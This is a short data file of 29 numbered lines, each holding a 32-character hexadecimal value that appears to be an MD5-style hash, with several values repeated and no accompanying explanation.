    01  3d5588c6c4680d76d2ba077526f32a5f
    02  fe1ac8183d11d4585d423a0ef1e21354
    03  eed2a6a9af2e107cdd5e722faf9ed37a
    04  3d5588c6c4680d76d2ba077526f32a5f
    05  fe1ac8183d11d4585d423a0ef1e21354
    06  a5a3b7dd758f68b0a278704adb369bab
    07  3d5588c6c4680d76d2ba077526f32a5f
    08  0ef30f135647c7c486081630caf708da
    09  0ef30f135647c7c486081630caf708da
    10  65974a65a535c47de5c6b6712ffa5c8d
    11  fe790227e59a7b92b642884eacb84841
    12  0ef30f135647c7c486081630caf708da
    13  3c5a73e8774f215ffdd890f5e6346a05
    14  fe790227e59a7b92b642884eacb84841
    15  752720442d3f869baff615ae37a01d64
    16  752720442d3f869baff615ae37a01d64
    17  994c18bfe477093681c6b1d60ca56ac9
    18  5fdbdb1b61e0717ba72b31741ae7ea19
    19  535375d7fc7b3ec068521ac5ab6680d4
    20  64d869a620dced95df997d91c5c2ecda
    21  16b97c2628a32cb876ede8bb4e6d5253
    22  16b97c2628a32cb876ede8bb4e6d5253
    23  eca0357ae57e1df149e2d016494173c9
    24  6e22a7980efe7c6bf44f821ea902d209
    25  6e22a7980efe7c6bf44f821ea902d209
    26  bfd73a5e0a64a9c334d1108004a98be5
    27  e55f4d4f79067737d4a95f11fdce1a13
    28  0141dc3481204f4334a0cb4cf6be2067
    29  8b31e2cda5a9dd5d728f55f44dc8e7ea


```
